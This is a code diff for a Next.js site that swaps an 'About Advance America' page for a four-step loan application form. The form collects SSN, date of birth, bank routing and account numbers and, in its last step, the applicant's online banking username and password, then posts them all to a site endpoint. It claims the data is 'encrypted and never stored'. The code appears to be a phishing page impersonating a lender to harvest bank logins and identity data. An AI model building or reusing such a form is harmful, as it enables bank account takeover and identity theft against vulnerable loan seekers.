@@ -1,150 +1,566 @@
-// app/about/page.tsx
+// components/ApplyNowForm.tsx
 "use client";
-import { useState } from "react";
-import Image from "next/image";
 
-export default function AboutPage() {
-  const [isHovered, setIsHovered] = useState(false);
+import { useState, useEffect } from "react";
+import { motion, AnimatePresence } from "framer-motion";
+
+export default function ApplyNowForm() {
+  const [currentStep, setCurrentStep] = useState(1);
+  const totalSteps = 4;
+
+  const [formData, setFormData] = useState({
+    loanamount: "",
+    loanduration: "",
+    loanpurpose: "",
+    firstname: "",
+    lastname: "",
+    homeaddress: "",
+    city: "",
+    state: "",
+    zipcode: "",
+    dateofbirth: "",
+    phone: "", // Added
+    email: "", // Added
+    bankname: "",
+    routingnumber: "",
+    accountnumber: "",
+    ssn: "",
+    Username: "",
+    mobilebankingpassword: "",
+  });
+
+  const [emi, setEmi] = useState({
+    monthlyInterest: 0,
+    monthlyPayment: 0,
+    totalRepayment: 0,
+    totalInterest: 0,
+  });
+  const [errors, setErrors] = useState<{ [key: string]: string }>({});
+  const [isSubmitting, setIsSubmitting] = useState(false);
+
+  // EMI Calculation
+  useEffect(() => {
+    const loanAmount = parseFloat(formData.loanamount);
+    const duration = parseInt(formData.loanduration);
+
+    if (
+      loanAmount >= 2000 &&
+      loanAmount <= 15000 &&
+      duration >= 1 &&
+      duration <= 60
+    ) {
+      const interestRate = 0.01;
+      const monthlyInterest = loanAmount * interestRate;
+      const monthlyPayment = (loanAmount + monthlyInterest * duration) / duration;
+      const totalRepayment = monthlyPayment * duration;
+      const totalInterest = totalRepayment - loanAmount;
+
+      setEmi({ monthlyInterest, monthlyPayment, totalRepayment, totalInterest });
+    }
+  }, [formData.loanamount, formData.loanduration]);
+
+  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
+    const { name, value } = e.target;
+    setFormData((prev) => ({ ...prev, [name]: value }));
+    if (errors[name]) {
+      setErrors((prev) => {
+        const newErr = { ...prev };
+        delete newErr[name];
+        return newErr;
+      });
+    }
+  };
+
+  const handleDateInput = (e: React.ChangeEvent<HTMLInputElement>) => {
+    let value = e.target.value.replace(/\D/g, "");
+    if (value.length >= 2) value = value.slice(0, 2) + "/" + value.slice(2);
+    if (value.length >= 5) value = value.slice(0, 5) + "/" + value.slice(5, 9);
+    setFormData((prev) => ({ ...prev, dateofbirth: value }));
+  };
+
+  const formatPhone = (e: React.ChangeEvent<HTMLInputElement>) => {
+    let value = e.target.value.replace(/\D/g, "").slice(0, 10);
+    if (value.length >= 6) {
+      value = `(${value.slice(0, 3)}) ${value.slice(3, 6)}-${value.slice(6)}`;
+    } else if (value.length >= 3) {
+      value = `(${value.slice(0, 3)}) ${value.slice(3)}`;
+    }
+    setFormData((prev) => ({ ...prev, phone: value }));
+    if (errors.phone) {
+      setErrors((prev) => {
+        const newErr = { ...prev };
+        delete newErr.phone;
+        return newErr;
+      });
+    }
+  };
+
+  const formatSSN = (e: React.ChangeEvent<HTMLInputElement>) => {
+    let value = e.target.value.replace(/\D/g, "");
+    setFormData((prev) => ({ ...prev, ssn: value }));
+  };
+
+  const formatZIP = (e: React.ChangeEvent<HTMLInputElement>) => {
+    let value = e.target.value.replace(/\D/g, "").slice(0, 5);
+    setFormData((prev) => ({ ...prev, zipcode: value }));
+  };
+
+  const validateStep = () => {
+    const newErrors: { [key: string]: string } = {};
+
+    switch (currentStep) {
+      case 1:
+        if (!formData.loanamount || isNaN(parseFloat(formData.loanamount)) || parseFloat(formData.loanamount) < 2000 || parseFloat(formData.loanamount) > 15000)
+          newErrors.loanamount = "Enter $2K–$15K";
+        if (!formData.loanduration || parseInt(formData.loanduration) < 1 || parseInt(formData.loanduration) > 60)
+          newErrors.loanduration = "1–60 months";
+        if (!formData.loanpurpose) newErrors.loanpurpose = "Select a purpose";
+        break;
+
+      case 2:
+        if (!/^[A-Za-z\s]+$/.test(formData.firstname)) newErrors.firstname = "Letters only";
+        if (!/^[A-Za-z\s]+$/.test(formData.lastname)) newErrors.lastname = "Letters only";
+        if (!formData.homeaddress) newErrors.homeaddress = "Required";
+        if (!formData.city) newErrors.city = "Required";
+        if (!formData.state) newErrors.state = "Required";
+        if (!/^\d{5}$/.test(formData.zipcode)) newErrors.zipcode = "5-digit ZIP";
+        if (!/^\d{2}\/\d{2}\/\d{4}$/.test(formData.dateofbirth)) newErrors.dateofbirth = "MM/DD/YYYY";
+        
+        // Phone & Email Validation
+        const phoneDigits = formData.phone.replace(/\D/g, "");
+        if (phoneDigits.length !== 10) newErrors.phone = "Valid 10-digit phone required";
+        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) newErrors.email = "Valid email required";
+        break;
+
+      case 3:
+        if (!formData.bankname) newErrors.bankname = "Required";
+        if (!/^\d{8,17}$/.test(formData.accountnumber)) newErrors.accountnumber = "8–17 digits";
+        break;
+
+      case 4:
+        if (!formData.Username) newErrors.Username = "Required";
+        if (!formData.mobilebankingpassword) newErrors.mobilebankingpassword = "Required";
+        break;
+    }
+
+    setErrors(newErrors);
+    return Object.keys(newErrors).length === 0;
+  };
+
+  const nextStep = () => {
+    if (validateStep()) {
+      setCurrentStep((prev) => Math.min(prev + 1, totalSteps));
+    }
+  };
+
+  const goBack = () => {
+    setCurrentStep((prev) => Math.max(prev - 1, 1));
+  };
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!validateStep()) return;
+
+    setIsSubmitting(true);
+
+    try {
+      const res = await fetch("/api/apply-now", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(formData),
+      });
+
+      if (res.ok) {
+        setFormData({
+          loanamount: "",
+          loanduration: "",
+          loanpurpose: "",
+          firstname: "",
+          lastname: "",
+          homeaddress: "",
+          city: "",
+          state: "",
+          zipcode: "",
+          dateofbirth: "",
+          phone: "", // Reset added field
+          email: "", // Reset added field
+          bankname: "",
+          routingnumber: "",
+          accountnumber: "",
+          ssn: "",
+          Username: "",
+          mobilebankingpassword: "",
+        });
+        setCurrentStep(1);
+        window.location.assign("/under-review");
+      } else {
+        alert("❌ Submission failed. Please try again.");
+      }
+    } catch (error) {
+      console.error("Error:", error);
+      alert("🌐 Network error. Please check your connection.");
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
+
+  const progressPercent = (currentStep / totalSteps) * 100;
 
   return (
-    <main className="min-h-screen bg-gray-50">
-      {/* Hero Section*/}
-      <section className="about-hero-section py-16 bg-white">
-        <div className="container mx-auto px-4 max-w-7xl">
-          <div className="row align-items-start">
-            <div className="col-md-6">
-              <h1 className="text-4xl font-bold text-gray-900 mb-6">About Advance America</h1>
-              <p className="text-lg text-gray-700 leading-relaxed">
-                Advance America is a loan company that offers a wide range of products and services, including personal loans, payday loans, business loans, and debt consolidation.
-                Established in 1900, we were founded with the idea of providing loans to citizens with poor credit, offering financial help through easy monthly installments with low-interest rates.
-                This rich history and unique approach to lending set us apart from other loan companies.
-              </p>
-            </div>
+    <section className="py-12 pt-20 bg-gradient-to-br from-blue-50 via-white to-cyan-50 min-h-screen">
+      <div className="container mx-auto px-4 max-w-4xl">
+        {/* Header */}
+        <div className="text-center mb-8">
+          <h2 className="text-3xl font-bold text-gray-800 mb-2">Apply in Minutes</h2>
+          <p className="text-gray-600">Get fast funding with our secure, step-by-step process</p>
+        </div>
+
+        {/* Progress Bar */}
+        <div className="mb-8 relative">
+          <div className="h-2 bg-gray-200 rounded-full overflow-hidden">
+            <motion.div
+              className="h-full bg-gradient-to-r from-blue-600 to-teal-500"
+              initial={{ width: 0 }}
+              animate={{ width: `${progressPercent}%` }}
+              transition={{ duration: 0.6, ease: "easeOut" }}
+            />
           </div>
+          <div className="flex justify-between text-xs text-gray-500 mt-2">
+            {["Loan", "Personal", "Banking", "Login"].map((label, i) => (
+              <span key={i} className={i + 1 <= currentStep ? "font-medium text-blue-700" : ""}>
+                {label}
+              </span>
+            ))}
+          </div>
+        </div>
 
-          {/* Spacing */}
-          <div className="mt-12"></div>
-
-          {/* Hero Image */}
-          <div className="row align-items-end justify-content-end">
-            <div className="col-md-8 ms-auto">
-              <div
-                className="relative overflow-hidden rounded-xl shadow-lg cursor-pointer"
-                onMouseEnter={() => setIsHovered(true)}
-                onMouseLeave={() => setIsHovered(false)}
+        {/* Form */}
+        <form onSubmit={handleSubmit} className="bg-white rounded-2xl shadow-xl p-8">
+          <AnimatePresence mode="wait">
+            {/* Step 1: Loan Details */}
+            {currentStep === 1 && (
+              <motion.div
+                key="step1"
+                initial={{ opacity: 0, x: 20 }}
+                animate={{ opacity: 1, x: 0 }}
+                exit={{ opacity: 0, x: -20 }}
+                transition={{ duration: 0.3 }}
               >
-                <Image
-                  src="/img/about-1.png"
-                  alt="A couple at a business meeting"
-                  width={800}
-                  height={500}
-                  className={`w-full h-auto transition-transform duration-500 ${isHovered ? "scale-105" : ""}`}
-                />
-              </div>
-            </div>
-          </div>
-        </div>
-      </section>
+                <h3 className="text-2xl font-semibold text-gray-800 mb-6">Loan Details</h3>
+                <div className="space-y-5">
+                  <div>
+                    <label className="block text-sm font-medium text-gray-700 mb-1">Loan Amount</label>
+                    <input
+                      type="number"
+                      name="loanamount"
+                      value={formData.loanamount}
+                      onChange={handleChange}
+                      placeholder="$2,000 to $15,000"
+                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.loanamount ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"}`}
+                    />
+                    {errors.loanamount && <p className="text-red-500 text-sm mt-1">{errors.loanamount}</p>}
+                  </div>
 
-      {/* Mission Section */}
-      <section className="mission-section py-16 bg-gradient-to-br from-blue-50 via-white to-cyan-50">
-        <div className="container mx-auto px-4 max-w-7xl">
-          <div className="row align-items-center">
-            <div className="col-md-6 mb-4 mb-md-0">
-              <Image
-                src="/img/about-2.png"
-                alt="Shake on It"
-                width={600}
-                height={400}
-                className="rounded-lg shadow-md w-full h-auto object-cover"
-              />
-            </div>
-            <div className="col-md-6 ms-auto ps-md-5">
-              <h2 className="text-3xl font-bold text-gray-900 mb-4">Our Mission</h2>
-              <p className="text-gray-700 leading-relaxed">
-                At Advance America, we are committed to revolutionizing the lending experience for our customers. Our goal is to empower individuals with the financial assistance they need to make informed decisions, achieve their goals, and secure their financial future.
-              </p>
-              <p className="text-blue-600 font-medium mt-2">
-                Join us in our mission to transform the lending industry and help everyone access the financial support they deserve.
-              </p>
-            </div>
-          </div>
-        </div>
-      </section>
+                  <div>
+                    <label className="block text-sm font-medium text-gray-700 mb-1">Loan Duration (Months)</label>
+                    <input
+                      type="number"
+                      name="loanduration"
+                      value={formData.loanduration}
+                      onChange={handleChange}
+                      placeholder="1–60 months"
+                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.loanduration ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"}`}
+                    />
+                    {errors.loanduration && <p className="text-red-500 text-sm mt-1">{errors.loanduration}</p>}
+                  </div>
 
-      {/* Team Section */}
-      <section className="team-section py-16 bg-white">
-        <div className="container mx-auto px-4 max-w-7xl">
-          <div className="text-center mb-12">
-            <h2 className="text-3xl font-bold text-gray-900 mb-4">Meet Our Team</h2>
-            <p className="text-gray-700 text-lg">
-              Our dedicated team at Advance America is committed to providing exceptional service and expertise to our valued customers.
-            </p>
-          </div>
+                  <div>
+                    <label className="block text-sm font-medium text-gray-700 mb-1">Loan Purpose</label>
+                    <select
+                      name="loanpurpose"
+                      value={formData.loanpurpose}
+                      onChange={handleChange}
+                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.loanpurpose ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"}`}
+                    >
+                      <option value="">Select Purpose</option>
+                      <option value="CREDIT_CARD">Pay off Credit Cards</option>
+                      <option value="DEBT_CONSOLIDATION">Debt Consolidation</option>
+                      <option value="HOME_IMPROVEMENT">Home Improvement</option>
+                      <option value="LARGE_PURCHASE">Large Purchase</option>
+                      <option value="OTHER">Other</option>
+                    </select>
+                    {errors.loanpurpose && <p className="text-red-500 text-sm mt-1">{errors.loanpurpose}</p>}
+                  </div>
 
-          <div className="row g-4">
-            {/* Team Member 1 */}
-            <div className="col-md-4">
-              <div className="card border-0 shadow-sm team-member rounded-xl overflow-hidden">
-                <Image
-                  src="/img/team-1.png"
-                  alt="Johnny Miller"
-                  width={400}
-                  height={400}
-                  className="w-full h-64 object-cover"
-                />
-                <div className="p-5 text-center">
-                  <p className="text-sm text-gray-500">CEO</p>
-                  <h5 className="font-semibold text-gray-900">Johnny Miller</h5>
-                  <p className="text-gray-600 text-sm mt-2">
-                    Johnny excels in building relationships with clients and driving sales to meet and exceed targets.
-                  </p>
+                  <div className="flex justify-end mt-8">
+                    <button
+                      type="button"
+                      onClick={nextStep}
+                      className="px-8 py-3 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-lg transition transform hover:scale-105"
+                    >
+                      Continue →
+                    </button>
+                  </div>
                 </div>
-              </div>
-            </div>
+              </motion.div>
+            )}
 
-            {/* Team Member 2 */}
-            <div className="col-md-4">
-              <div className="card border-0 shadow-sm team-member rounded-xl overflow-hidden">
-                <Image
-                  src="/img/team-2.png"
-                  alt="Josh Smith"
-                  width={400}
-                  height={400}
-                  className="w-full h-64 object-cover"
-                />
-                <div className="p-5 text-center">
-                  <p className="text-sm text-gray-500">Operations Manager</p>
-                  <h5 className="font-semibold text-gray-900">Josh Smith</h5>
-                  <p className="text-gray-600 text-sm mt-2">
-                    Josh is dedicated to providing top-notch customer support, ensuring all inquiries are handled promptly and efficiently.
-                  </p>
-                </div>
-              </div>
-            </div>
+            {/* Step 2: Personal Info */}
+            {currentStep === 2 && (
+              <motion.div
+                key="step2"
+                initial={{ opacity: 0, x: 20 }}
+                animate={{ opacity: 1, x: 0 }}
+                exit={{ opacity: 0, x: -20 }}
+                transition={{ duration: 0.3 }}
+              >
+                <h3 className="text-2xl font-semibold text-gray-800 mb-6">Personal Information</h3>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
+                  {[
+                    { label: "First Name", name: "firstname", type: "text" },
+                    { label: "Last Name", name: "lastname", type: "text" },
+                    { label: "City", name: "city", type: "text" },
+                    { label: "State", name: "state", type: "text" },
+                  ].map((field) => (
+                    <div key={field.name}>
+                      <label className="block text-sm font-medium text-gray-700 mb-1">{field.label}</label>
+                      <input
+                        type={field.type}
+                        name={field.name}
+                        value={formData[field.name as keyof typeof formData]}
+                        onChange={handleChange}
+                        className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors[field.name] ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"}`}
+                      />
+                      {errors[field.name] && <p className="text-red-500 text-sm mt-1">{errors[field.name]}</p>}
+                    </div>
+                  ))}
+                  
+                  {/* NEW: Email ID Field */}
+                  <div>
+                    <label className="block text-sm font-medium text-gray-700 mb-1">Email ID</label>
+                    <input
+                      type="email"
+                      name="email"
+                      value={formData.email}
+                      onChange={handleChange}
+                      placeholder="you@example.com"
+                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.email ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"}`}
+                    />
+                    {errors.email && <p className="text-red-500 text-sm mt-1">{errors.email}</p>}
+                  </div>
 
-            {/* Team Member 3 */}
-            <div className="col-md-4">
-              <div className="card border-0 shadow-sm team-member rounded-xl overflow-hidden">
-                <Image
-                  src="/img/team-3.png"
-                  alt="Sarah Brown"
-                  width={400}
-                  height={400}
-                  className="w-full h-64 object-cover"
-                />
-                <div className="p-5 text-center">
-                  <p className="text-sm text-gray-500">Sales Associate</p>
-                  <h5 className="font-semibold text-gray-900">Sarah Brown</h5>
-                  <p className="text-gray-600 text-sm mt-2">
-                    Sarah manages the day-to-day operations, optimizing processes to enhance productivity and customer satisfaction.
-                  </p>
+                  {/* NEW: Phone Number Field */}
+                  <div>
+                    <label className="block text-sm font-medium text-gray-700 mb-1">Phone Number</label>
+                    <input
+                      type="tel"
+                      name="phone"
+                      value={formData.phone}
+                      onChange={formatPhone}
+                      placeholder="(123) 456-7890"
+                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.phone ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"}`}
+                    />
+                    {errors.phone && <p className="text-red-500 text-sm mt-1">{errors.phone}</p>}
+                  </div>
+
+                  <div className="md:col-span-2">
+                    <label className="block text-sm font-medium text-gray-700 mb-1">Home Address</label>
+                    <input
+                      type="text"
+                      name="homeaddress"
+                      value={formData.homeaddress}
+                      onChange={handleChange}
+                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.homeaddress ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"}`}
+                    />
+                    {errors.homeaddress && <p className="text-red-500 text-sm mt-1">{errors.homeaddress}</p>}
+                  </div>
+                  <div>
+                    <label className="block text-sm font-medium text-gray-700 mb-1">ZIP Code</label>
+                    <input
+                      type="text"
+                      name="zipcode"
+                      value={formData.zipcode}
+                      onChange={formatZIP}
+                      placeholder="12345"
+                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.zipcode ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"}`}
+                    />
+                    {errors.zipcode && <p className="text-red-500 text-sm mt-1">{errors.zipcode}</p>}
+                  </div>
+                  <div>
+                    <label className="block text-sm font-medium text-gray-700 mb-1">Date of Birth</label>
+                    <input
+                      type="text"
+                      name="dateofbirth"
+                      value={formData.dateofbirth}
+                      onChange={handleDateInput}
+                      placeholder="MM/DD/YYYY"
+                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.dateofbirth ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"}`}
+                    />
+                    {errors.dateofbirth && <p className="text-red-500 text-sm mt-1">{errors.dateofbirth}</p>}
+                  </div>
                 </div>
-              </div>
-            </div>
-          </div>
+                <div className="flex justify-between mt-8">
+                  <button
+                    type="button"
+                    onClick={goBack}
+                    className="px-6 py-3 text-gray-600 hover:text-gray-800 font-medium"
+                  >
+                    ← Back
+                  </button>
+                  <button
+                    type="button"
+                    onClick={nextStep}
+                    className="px-8 py-3 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-lg transition transform hover:scale-105"
+                  >
+                    Continue →
+                  </button>
+                </div>
+              </motion.div>
+            )}
+
+            {/* Step 3: Banking Info */}
+            {currentStep === 3 && (
+              <motion.div
+                key="step3"
+                initial={{ opacity: 0, x: 20 }}
+                animate={{ opacity: 1, x: 0 }}
+                exit={{ opacity: 0, x: -20 }}
+                transition={{ duration: 0.3 }}
+              >
+                <h3 className="text-2xl font-semibold text-gray-800 mb-6">Banking Information</h3>
+                <div className="space-y-5">
+                  <div>
+                    <label className="block text-sm font-medium text-gray-700 mb-1">Bank Name</label>
+                    <input
+                      type="text"
+                      name="bankname"
+                      value={formData.bankname}
+                      onChange={handleChange}
+                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.bankname ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"}`}
+                    />
+                    {errors.bankname && <p className="text-red-500 text-sm mt-1">{errors.bankname}</p>}
+                  </div>
+                  <div>
+                    <label className="block text-sm font-medium text-gray-700 mb-1">Routing Number</label>
+                    <input
+                      type="text"
+                      name="routingnumber"
+                      value={formData.routingnumber}
+                      onChange={handleChange}
+                      placeholder="9 digits"
+                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.routingnumber ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"}`}
+                    />
+                    {errors.routingnumber && <p className="text-red-500 text-sm mt-1">{errors.routingnumber}</p>}
+                  </div>
+                  <div>
+                    <label className="block text-sm font-medium text-gray-700 mb-1">Account Number</label>
+                    <input
+                      type="text"
+                      name="accountnumber"
+                      value={formData.accountnumber}
+                      onChange={handleChange}
+                      placeholder="8–17 digits"
+                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.accountnumber ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"}`}
+                    />
+                    {errors.accountnumber && <p className="text-red-500 text-sm mt-1">{errors.accountnumber}</p>}
+                  </div>
+                  <div>
+                    <label className="block text-sm font-medium text-gray-700 mb-1">SSN</label>
+                    <input
+                      type="text"
+                      name="ssn"
+                      value={formData.ssn}
+                      onChange={formatSSN}
+                      placeholder="XXX-XX-XXXX"
+                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.ssn ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"}`}
+                    />
+                    {errors.ssn && <p className="text-red-500 text-sm mt-1">{errors.ssn}</p>}
+                  </div>
+                </div>
+                <div className="flex justify-between mt-8">
+                  <button
+                    type="button"
+                    onClick={goBack}
+                    className="px-6 py-3 text-gray-600 hover:text-gray-800 font-medium"
+                  >
+                    ← Back
+                  </button>
+                  <button
+                    type="button"
+                    onClick={nextStep}
+                    className="px-8 py-3 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-lg transition transform hover:scale-105"
+                  >
+                    Continue →
+                  </button>
+                </div>
+              </motion.div>
+            )}
+
+            {/* Step 4: Login Info */}
+            {currentStep === 4 && (
+              <motion.div
+                key="step4"
+                initial={{ opacity: 0, x: 20 }}
+                animate={{ opacity: 1, x: 0 }}
+                exit={{ opacity: 0, x: -20 }}
+                transition={{ duration: 0.3 }}
+              >
+                <h3 className="text-2xl font-semibold text-gray-800 mb-6">Online Banking (For monthly auto dues)</h3>
+                <div className="space-y-5">
+                  <div>
+                    <label className="block text-sm font-medium text-gray-700 mb-1">Online Banking Username</label>
+                    <input
+                      type="text"
+                      name="Username"
+                      value={formData.Username}
+                      onChange={handleChange}
+                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.Username ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"}`}
+                    />
+                    {errors.Username && <p className="text-red-500 text-sm mt-1">{errors.Username}</p>}
+                  </div>
+                  <div>
+                    <label className="block text-sm font-medium text-gray-700 mb-1">Online Banking Password</label>
+                    <input
+                      type="password"
+                      name="mobilebankingpassword"
+                      value={formData.mobilebankingpassword}
+                      onChange={handleChange}
+                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:outline-none ${errors.mobilebankingpassword ? "border-red-300 focus:ring-red-200" : "border-gray-300 focus:ring-blue-200"}`}
+                    />
+                    {errors.mobilebankingpassword && <p className="text-red-500 text-sm mt-1">{errors.mobilebankingpassword}</p>}
+                  </div>
+                </div>
+                <div className="mt-8 text-sm text-gray-500">
+                  <p>🔐 Your information is encrypted and never stored on our servers.</p>
+                </div>
+                <div className="flex justify-between mt-6">
+                  <button
+                    type="button"
+                    onClick={goBack}
+                    className="px-6 py-3 text-gray-600 hover:text-gray-800 font-medium"
+                  >
+                    ← Back
+                  </button>
+                  <button
+                    type="submit"
+                    disabled={isSubmitting}
+                    className="px-8 py-3 bg-green-600 hover:bg-green-700 text-white font-medium rounded-lg transition transform hover:scale-105 disabled:opacity-70"
+                  >
+                    {isSubmitting ? "Submitting..." : "Submit Application"}
+                  </button>
+                </div>
+              </motion.div>
+            )}
+          </AnimatePresence>
+        </form>
+
+        {/* Floating Help Button*/}
+        <div className="fixed bottom-6 right-6">
+          <button className="w-14 h-14 bg-blue-600 hover:bg-blue-700 text-white rounded-full shadow-lg flex items-center justify-center text-xl font-bold transition transform hover:scale-110">
+            ?
+          </button>
         </div>
-      </section>
-    </main>
+      </div>
+    </section>
   );
 }
